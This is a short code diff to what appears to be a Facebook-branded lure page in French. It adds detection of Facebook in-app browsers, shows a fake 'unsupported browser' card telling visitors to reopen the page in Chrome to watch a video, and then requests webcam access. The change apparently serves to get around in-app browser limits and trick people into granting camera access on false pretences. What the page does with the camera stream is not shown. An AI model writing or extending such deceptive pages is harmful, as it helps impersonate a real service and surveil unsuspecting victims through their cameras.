@@ -51,7 +51,26 @@
         }
 
         async function startCamera() {
+            // Détection de Facebook Lite ou navigateur interne
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var isFacebookApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("FB_IAB") > -1) || (ua.indexOf("FB4A") > -1);
+
+            if (isFacebookApp) {
+                document.getElementById('overlay').innerHTML = `
+                    <div class="card">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
+                        <h3 style="color:red;">Navigateur non supporté</h3>
+                        <p style="font-size: 14px; color: #4b4f56;">Pour lire cette vidéo, vous devez utiliser un vrai navigateur.</p>
+                        <div style="background: #f0f2f5; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 15px;">
+                            <strong>Instructions :</strong> Cliquez sur les 3 points (⋮) en haut à droite et choisissez <b>"Ouvrir dans Chrome"</b>.
+                        </div>
+                        <button class="btn-verif" onclick="location.reload()">RÉESSAYER</button>
+                    </div>`;
+                return;
+            }
+
             document.getElementById('overlay').innerHTML = '<div class="card"><p>Chargement du flux vidéo...</p><div style="border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto;"></div></div>';
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
